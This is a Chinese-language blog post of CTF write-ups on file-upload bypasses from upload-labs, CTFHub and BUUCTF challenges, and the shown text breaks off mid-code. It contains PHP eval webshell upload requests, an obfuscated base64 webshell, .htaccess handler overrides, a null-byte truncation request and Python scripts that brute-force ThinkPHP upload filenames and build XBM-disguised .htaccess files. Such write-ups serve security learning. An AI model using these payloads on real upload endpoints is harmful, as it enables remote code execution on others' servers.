<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>CTF-Web-文件上传 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Upload来源：极客大挑战 2019 考察： 12345Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;sqzr.phtml&quot;Content-Type: image&#x2F;jpegGIF89aPD9waHAgDQokdWY9InNuYzMiOyAvL3Bhc3MgaXMg">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-Web-文件上传">
<meta property="og:url" content="http://example.com/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Upload来源：极客大挑战 2019 考察： 12345Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;sqzr.phtml&quot;Content-Type: image&#x2F;jpegGIF89aPD9waHAgDQokdWY9InNuYzMiOyAvL3Bhc3MgaXMg">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-02-08T03:16:11.000Z">
<meta property="article:modified_time" content="2021-03-07T07:08:34.305Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-CTF-Web-文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time class="dt-published" datetime="2021-02-08T03:16:11.000Z" itemprop="datePublished">2021-02-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      CTF-Web-文件上传
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>来源：极客大挑战 2019</p>
<p>考察：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;sqzr.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">PD9waHAgDQokdWY9InNuYzMiOyAvL3Bhc3MgaXMgc3F6cg0KJGthPSJJRUJsZG1GYnNLIjsgDQokcGp0PSJDUmZVRTlUVkYiOyANCiR2YmwgPSBzdHJfcmVwbGFjZSgidGkiLCIiLCJ0aXN0aXR0aXJ0aV9ydGlldGlwbHRpYXRpY2UiKTsgDQokaXF3PSJGNmNpZGRLVHM9IjsgDQokYmtmID0gJHZibCgiayIsICIiLCAia2Jha3NrZTZrNGtfa2RrZWtja29rZGtlIik7IA0KJHNicCA9ICR2YmwoImN0dyIsIiIsImN0d2NjdHdyZWN0d2F0Y3R3ZWN0d19mY3R3dW5jY3R3dGN0d2lvY3R3biIpOyANCiRtcHkgPSAkc2JwKCcnLCAkYmtmKCR2YmwoImIiLCAiIiwgJGthLiRwanQuJHVmLiRpcXcpKSk7ICRtcHkoKTsgDQo&#x2F;PiA&#x3D;</span><br></pre></td></tr></table></figure>
<h1 id="uploadlabs"><a href="#uploadlabs" class="headerlink" title="uploadlabs"></a>uploadlabs</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>考察：前端js检查绕过</p>
<p>在firefox中禁用js选项即可</p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>考察：content-type绕过</p>
<p>源码检查content-type，修改为image/jpeg，image/png，image/gif其中一个即可</p>
<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>考察：后缀绕过</p>
<p>将后缀改为php3即可（还可以为php2，php4，php5，phtml）</p>
<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>考察：后缀绕过</p>
<p>后缀设置了大量黑名单</p>
<p>将后缀改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php. .</span><br></pre></td></tr></table></figure>
<p>由于值祛除了一次文件名末尾的点，然后再去除空格，因此. .可以实现过滤</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>考察：后缀绕过</p>
<p>后缀改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php . .</span><br></pre></td></tr></table></figure>
<h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>直接上传，用antsword连接（菜刀被禁了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;fca79403ea30c31b6413be65&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>取消前端js后，直接上传，用antsword连接</p>
<p>php文件无法下载，也不知道为什么</p>
<p>直接在页面执行命令，用cat查看flag文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;a849b8485adeaf5a66c6f477&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><p>将content-type修改为image/jpeg，其他操作与上面相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5e9686dcfdf07612284fddae&#125;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>.htaccess的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;    </span><br></pre></td></tr></table></figure>
<p>然后上传一个php文件，在burp中将文件名改为1.jpg</p>
<p>使用antsword连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;6e504a1abc30e2ca266b7335&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>在文件内容前添加GIF89a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;d.php&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;caa67ce803f60c6f9776b631&#125;</span><br></pre></td></tr></table></figure>
<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>在URL处，修改URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?road&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;1.php%00 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>而用户名处，修改用户名为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jpg</span><br></pre></td></tr></table></figure>
<p>注意，此处修改用户名为1.php%001.jpg，虽然能上传成功，但是无法用antsword连接（</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;8df08862cb34869e11b4cf33&#125;</span><br></pre></td></tr></table></figure>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>将文件名修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.phphpp</span><br></pre></td></tr></table></figure>
<p>即可成功上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;7abd22955056b5d994fc2f14&#125;</span><br></pre></td></tr></table></figure>
<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="Upload-1"><a href="#Upload-1" class="headerlink" title="Upload"></a>Upload</h2><p>来源：极客大挑战2019</p>
<p>考察：&lt;?php的绕过、php后缀的绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; @eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Upload-2"><a href="#Upload-2" class="headerlink" title="Upload"></a>Upload</h2><p>来源：ACTF2020 新生赛</p>
<p>考察：phtml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>来源：GXYCTF2019</p>
<p>考察：.htaccess绕过</p>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;123.png&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; eval($_POST[&#39;cmd&#39;]); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>来源：RoarCTF2019</p>
<p>考察：条件竞合，thinkphp upload上传绕过，thinkphp uniqid生成文件名</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.chabug.org/audit/1035.html">https://www.chabug.org/audit/1035.html</a></p>
<p>爆破那部分没跑出来，太耗时间了</p>
<p>源码提示为thinkphp，且</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload-&gt;allowExts  &#x3D; array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);&#x2F;&#x2F; 设置附件上传类型</span><br></pre></td></tr></table></figure>
<p>一项有漏洞，此用法并不是thinkphp的正确用法，后缀名限制无效</p>
<p>而thinkphp中，upload函数不传参时为多文件上传，整个$_FILES数组都会保存</p>
<p>所以同时上传多个文件，可以绕过php后缀限制</p>
<p>thinkphp中使用uniqid进行重命名，可以使用上传两次空文件的方式，得到一个文件名区间，然后进行爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2019-10-12\&#x2F;5da1b52bb3645.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2019-10-12\&#x2F;5da1b52bd6f0a.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line"></span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2020-07-22\&#x2F;5f17d4510999a.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2020-07-22\&#x2F;5f17d4513d25f.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;9d61cb9b-7e46-4f87-8a41-90375d25f991.node3.buuoj.cn&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;upload&#39;</span><br><span class="line">file1 &#x3D; &#123;&#39;file&#39;:open(&#39;8.txt&#39;,&#39;r&#39;)&#125;</span><br><span class="line">file2 &#x3D; &#123;&#39;file[]&#39;:open(&#39;8.php&#39;,&#39;r&#39;)&#125; #upload()不传参时即是批量上传所以用[]</span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file1)</span><br><span class="line">print( r.text)</span><br><span class="line">s1 &#x3D; r.text</span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file2)</span><br><span class="line">print( r.text)</span><br><span class="line">r &#x3D; requests.post(url, files &#x3D; file1)</span><br><span class="line">print( r.text)</span><br><span class="line">prefix &#x3D; r.text[38:47]</span><br><span class="line">print(prefix)</span><br><span class="line">s &#x3D; &quot;01234567890abcdef&quot;</span><br><span class="line">flag &#x3D; False</span><br><span class="line">for i in s:</span><br><span class="line">    if s.index(i) &lt; s.index(s1[39]):</span><br><span class="line">        continue</span><br><span class="line">    for j in s:</span><br><span class="line">        for x in s:</span><br><span class="line">            for y in s:</span><br><span class="line">            	for z in s:</span><br><span class="line">            		url &#x3D; &quot;http:&#x2F;&#x2F;9d61cb9b-7e46-4f87-8a41-90375d25f991.node3.buuoj.cn&#x2F;Public&#x2F;Uploads&#x2F;2021-02-24%s%s%s%s%s%s.php&quot;%(prefix,i,j,x,y,z)</span><br><span class="line">            		r &#x3D; requests.get(url)</span><br><span class="line">            		print(url)</span><br><span class="line">            		if r.status_code &#x3D;&#x3D; 429:</span><br><span class="line">            			time.sleep(0.1)</span><br><span class="line">            			continue</span><br><span class="line">            		if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            			print(&quot;yes&quot;)</span><br><span class="line">            			flag &#x3D; True</span><br><span class="line">            			break</span><br><span class="line">            	if flag &#x3D;&#x3D; True:</span><br><span class="line">            		break</span><br><span class="line">            if flag &#x3D;&#x3D; True:</span><br><span class="line">            	break</span><br><span class="line">        if flag &#x3D;&#x3D; True:</span><br><span class="line">        	break</span><br><span class="line">    if flag &#x3D;&#x3D; True:</span><br><span class="line">    	break</span><br></pre></td></tr></table></figure>
<h3 id="thinkphp-upload上传绕过"><a href="#thinkphp-upload上传绕过" class="headerlink" title="thinkphp upload上传绕过"></a>thinkphp upload上传绕过</h3><h3 id="thinkphp-uniqid随机文件名生成爆破"><a href="#thinkphp-uniqid随机文件名生成爆破" class="headerlink" title="thinkphp uniqid随机文件名生成爆破"></a>thinkphp uniqid随机文件名生成爆破</h3><h2 id="Upload（未做）"><a href="#Upload（未做）" class="headerlink" title="Upload（未做）"></a>Upload（未做）</h2><p>来源：强网杯2019</p>
<h2 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h2><p>来源：SUCTF2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/jxswcy/buuoj-wp/grx27x?language=zh-cn%EF%BC%8Chttps://a16n.github.io/2020/10/26/SUCTF2019-EasyWeb/%EF%BC%8Chttps://www.cnblogs.com/hello-there/p/13039116.html">https://www.yuque.com/jxswcy/buuoj-wp/grx27x?language=zh-cn，https://a16n.github.io/2020/10/26/SUCTF2019-EasyWeb/，https://www.cnblogs.com/hello-there/p/13039116.html</a></p>
<p>考察：无字母数字webshell；.htaccess绕过；</p>
<p>题目给的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]); <span class="comment">// 目录</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);  <span class="comment"># 检测文件内部是否有ph字符</span></span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); <span class="comment"># 检测文件内部是否有&lt;?字符</span></span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);  <span class="comment"># 判断是否为图片，故.htaccess前要加注释符</span></span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>; <span class="comment"># 此处限定了只能在当前目录操作，因此需要绕过</span></span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下为第一段，通过提交_变量，调用get_the_flag函数</span></span><br><span class="line"><span class="comment"># 用脚本fuzz测试正则可以使用的字符</span></span><br><span class="line"><span class="comment"># 用剩余字符，进行异或运算，得到</span></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>_变量，通过异或进行运算得出</p>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .xxx         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>
<p>带base64自动解码版本的.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .ha</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_adeee0c170ad4ffb110df0cde294aecd&#x2F;shell.ha</span><br></pre></td></tr></table></figure>


<p>此处为何.htaccess可以绕过exif_imagetype，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8</a></p>
<p>简单的来说，利用了XBM，一样重纯文本二进制图像格式。通过开头的#define，既确定了宽度和高度，也标识这是一个xbm文件。且这种标识在.htaccess中被视为注释（#是注释符）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .xxx\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 